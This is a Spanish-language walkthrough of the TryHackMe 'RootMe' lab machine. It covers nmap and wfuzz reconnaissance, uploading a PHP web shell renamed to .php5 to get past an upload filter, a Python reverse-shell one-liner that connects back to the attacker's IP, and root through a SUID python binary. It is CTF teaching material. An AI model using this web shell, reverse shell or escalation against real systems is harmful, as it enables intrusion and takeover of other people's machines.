---
title: Try Hack Me RootMe
author: k4miyo
date: 2023-06-17
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Web, Reverse Shell, PHP]
ping: true
---

## Máquina RootMe
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.250.92.

```bash
❯ ping -c 1 10.10.250.92
PING 10.10.250.92 (10.10.250.92) 56(84) bytes of data.
64 bytes from 10.10.250.92: icmp_seq=1 ttl=63 time=165 ms

--- 10.10.250.92 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 165.038/165.038/165.038/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.250.92 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:16 CST
Initiating Parallel DNS resolution of 1 host. at 21:16
Completed Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:16
Scanning 10.10.124.47 [65535 ports]
Discovered open port 22/tcp on 10.10.124.47
Discovered open port 80/tcp on 10.10.124.47
Completed SYN Stealth Scan at 21:16, 20.02s elapsed (65535 total ports)
Nmap scan report for 10.10.124.47
Host is up, received user-set (0.16s latency).
Scanned at 2023-06-17 21:16:18 CST for 20s
Not shown: 65160 closed tcp ports (reset), 373 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.14 seconds
           Raw packets sent: 98745 (4.345MB) | Rcvd: 92679 (3.707MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.250.92
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.250.92 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:18 CST
Nmap scan report for 10.10.124.47
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.25 seconds
```

Se observa el puerto 80 abierto, por lo tanto, antes de ingresar vía web, vamos a quer a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.250.92/
http://10.10.250.92/ [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.92], Script, Title[HackIT - Home]
```

No vemos nada interesante, así que ingresaremos vía web.

![](/assets/images/thm-rootme/rootme.png)

No observamos algo adicional, por lo que vamos a tratar de descubrir directorios dentro del servidor web:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.250.92/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.250.92/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000150:   200        15 L     49 W       743 Ch      "uploads"                                                                                                                   
000000536:   200        17 L     67 W       1125 Ch     "css"                                                                                                                       
000000939:   200        16 L     60 W       958 Ch      "js"                                                                                                                        
000005506:   200        22 L     47 W       732 Ch      "panel"                                                                                                                     
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 8288
Filtered Requests: 8284
Requests/sec.: 0
```

Encontramos 2 recursos interesantes, vamos a echarles un ojo:

![](/assets/images/thm-rootme/rootme1.png)

![](/assets/images/thm-rootme/rootme2.png)

Vemos que podemos subir un archivo y posiblemente la ruta en donde se guardará el archivo, podríamos tratar de subir un archivo txt de prueba.

![](/assets/images/thm-rootme/rootme3.png)

![](/assets/images/thm-rootme/rootme4.png)

Ahora tratemos de subir un archivo php que nos permita la ejecución de comando a nivel de sistema:

```bash
❯ catn k4mishell.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```

![](/assets/images/thm-rootme/rootme5.png)

Nos manda un error al tratar de subir el archivo php, por lo que podriamos tratar otras extensiones que nos permita acceder:

- php3
- php4
- php5
- phtml

Al subir el archivo de extensión **php5** vemos que podemos subir el archivo y ejecutar comandos a nivel de sistema.

![](/assets/images/thm-rootme/rootme6.png)

Trataremos en entablarnos una reverse shell a nuestro equipo de atacante. Para este caso, utilizaremos una reverse shell en python de acuerdo con [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
10.10.250.92/uploads/k4mishell.php5?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.85.95%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.250.92] 46254
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro de la máquina y para trabajar más cómodos, haremos un [Tratamiento de la tty](/posts/tratamiento-tty). Como ya nos encontramos dentro de la máquina, podemos visualizar la primera flag (user.txt) que se encuentra en `/var/www/`. Ahora debemos buscar una forma de escalar privilegios.

```bash
www-data@rootme:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@rootme:/var/www$ sudo -l
[sudo] password for www-data: 
www-data@rootme:/var/www$ cd / 
www-data@rootme:/$ find \-perm /4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/traceroute6.iputils
./usr/bin/newuidmap
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/python
./usr/bin/at
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
./snap/core/8268/bin/mount
./snap/core/8268/bin/ping
./snap/core/8268/bin/ping6
./snap/core/8268/bin/su
./snap/core/8268/bin/umount
./snap/core/8268/usr/bin/chfn
./snap/core/8268/usr/bin/chsh
./snap/core/8268/usr/bin/gpasswd
./snap/core/8268/usr/bin/newgrp
./snap/core/8268/usr/bin/passwd
./snap/core/8268/usr/bin/sudo
./snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/8268/usr/lib/openssh/ssh-keysign
./snap/core/8268/usr/lib/snapd/snap-confine
./snap/core/8268/usr/sbin/pppd
./snap/core/9665/bin/mount
./snap/core/9665/bin/ping
./snap/core/9665/bin/ping6
./snap/core/9665/bin/su
./snap/core/9665/bin/umount
./snap/core/9665/usr/bin/chfn
./snap/core/9665/usr/bin/chsh
./snap/core/9665/usr/bin/gpasswd
./snap/core/9665/usr/bin/newgrp
./snap/core/9665/usr/bin/passwd
./snap/core/9665/usr/bin/sudo
./snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/9665/usr/lib/openssh/ssh-keysign
./snap/core/9665/usr/lib/snapd/snap-confine
./snap/core/9665/usr/sbin/pppd
./bin/mount
./bin/su
./bin/fusermount
./bin/ping
./bin/umount
www-data@rootme:/$ 
```

Vemos que tenemos permisos SUID para el binario python, por lo que vamos a nuestra página de confianza [GTFobins](https://gtfobins.github.io/):

```bash
www-data@rootme:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visulizar la flag (root.txt).